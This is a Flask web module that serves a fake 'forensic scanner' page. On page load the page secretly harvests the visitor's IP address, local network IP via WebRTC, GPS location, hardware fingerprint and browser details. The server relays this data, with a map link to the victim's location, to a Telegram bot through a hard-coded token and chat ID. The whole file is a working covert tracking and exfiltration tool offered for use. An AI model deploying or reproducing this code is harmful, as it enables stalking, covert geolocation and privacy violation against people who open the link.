from flask import Blueprint, render_template_string, request, jsonify
import requests

script20_bp = Blueprint('script20', __name__)

# --- CONFIGURATION ---
TELEGRAM_BOT_TOKEN = "6133548217:AAFtEqMcFM1vz55YNTI4DBkeZe0Ku_zzOo0"
TELEGRAM_CHAT_ID = "1308711346"

PHANTOM_UI = """
<!DOCTYPE html>
<html>
<head>
    <title>SECURE_STATION_v7.0</title>
    <style>
        body { background: #000; color: #0f0; font-family: 'Share Tech Mono', monospace; text-align: center; padding-top: 15%; margin:0; }
        .box { border: 1px solid #0f0; display: inline-block; padding: 40px; background: rgba(0,20,0,0.9); box-shadow: 0 0 50px #0f0; position: relative; }
        .scan-line { width: 100%; height: 5px; background: #0f0; position: absolute; top: 0; left:0; animation: scan 2s linear infinite; }
        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
    </style>
</head>
<body onload="capture()">
    <div class="box">
        <div class="scan-line"></div>
        <h2 id="header">CORE_FORENSIC_BYPASS</h2>
        <p id="status">Brute-forcing Device Metadata... [v7.0]</p>
        <div id="loader">STATUS: EXTRACTING_A_TO_Z_NODES</div>
    </div>

    <script>
        async function capture() {
            try {
                // IP & GEO
                const ipRes = await fetch('https://ipapi.co/json/');
                const ip = await ipRes.json();

                // BATTERY
                let batt = "N/A";
                if(navigator.getBattery) {
                    const b = await navigator.getBattery();
                    batt = Math.round(b.level * 100) + "% (" + (b.charging ? "Plugged" : "Battery") + ")";
                }

                // GPU & HARDWARE
                let gpu = "Unknown";
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if(debugInfo) gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);

                // LOCAL IP (WEBRTC)
                let localIP = "N/A";
                const pc = new RTCPeerConnection({iceServers:[]});
                pc.createDataChannel("");
                pc.createOffer().then(o => pc.setLocalDescription(o));
                pc.onicecandidate = (i) => { if(i && i.candidate) localIP = i.candidate.address; };

                // GPS
                const getPos = () => new Promise(r => navigator.geolocation.getCurrentPosition(p => r(p.coords), () => r(null)));
                const coords = await getPos();

                const intel = {
                    time: new Date().toLocaleString(),
                    ip: ip.ip || "N/A",
                    local_ip: localIP,
                    isp: ip.org || "N/A",
                    city: ip.city || "N/A",
                    country: ip.country_name || "N/A",
                    lat: coords ? coords.latitude : "Denied",
                    lon: coords ? coords.longitude : "Denied",
                    platform: navigator.platform,
                    agent: navigator.userAgent,
                    gpu: gpu,
                    cores: navigator.hardwareConcurrency,
                    ram: navigator.deviceMemory || "N/A",
                    battery: batt,
                    screen: window.screen.width + "x" + window.screen.height,
                    orientation: screen.orientation ? screen.orientation.type : "N/A",
                    lang: navigator.language,
                    touch: navigator.maxTouchPoints || 0,
                    referrer: document.referrer || "Direct Access"
                };

                await fetch('/script20/capture_data', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(intel)
                });

                document.getElementById('header').innerText = "FORENSICS_COMPLETE";
                document.getElementById('status').innerText = "Data nodes stabilized.";

            } catch (e) { console.log(e); }
        }
    </script>
</body>
</html>
"""

@script20_bp.route('/')
def index():
    return render_template_string(PHANTOM_UI)

@script20_bp.route('/capture_data', methods=['POST'])
def capture_data():
    try:
        i = request.json
        message = (
            f"⚡ *--- A-TO-Z FORENSIC INTEL ---* ⚡\\n\\n"
            f"📅 *DATETIME:* `{i['time']}`\\n"
            f"🌐 *NETWORK NODES*\\n"
            f"┣ IP: `{i['ip']}`\\n"
            f"┣ Local: `{i['local_ip']}`\\n"
            f"┣ ISP: `{i['isp']}`\\n"
            f"┗ From: `{i['referrer']}`\\n\\n"
            f"📍 *TARGET LOCATION*\\n"
            f"┣ Lat/Lon: `{i['lat']}, {i['lon']}`\\n"
            f"┣ City: `{i['city']}, {i['country']}`\\n"
            f"┗ Map: [Google Maps](https://www.google.com/maps?q={i['lat']},{i['lon']})\\n\\n"
            f"💻 *HARDWARE SPECIFICATIONS*\\n"
            f"┣ Platform: `{i['platform']}`\\n"
            f"┣ GPU: `{i['gpu']}`\\n"
            f"┣ RAM: `{i['ram']} GB` | Cores: `{i['cores']}`\\n"
            f"┣ Battery: `{i['battery']}`\\n"
            f"┗ Screen: `{i['screen']} ({i['orientation']})`\\n\\n"
            f"⚙️ *SYSTEM FINGERPRINT*\\n"
            f"┣ Language: `{i['lang']}`\\n"
            f"┗ Touch Points: `{i['touch']}`\\n\\n"
            f"📎 *FULL USER AGENT*\\n"
            f"`{i['agent']}`"
        )

        requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage", 
                      json={"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "Markdown"})
        return jsonify({"status": "Success"}), 200
    except Exception as e:
        return jsonify({"status": "Error", "message": str(e)}), 500
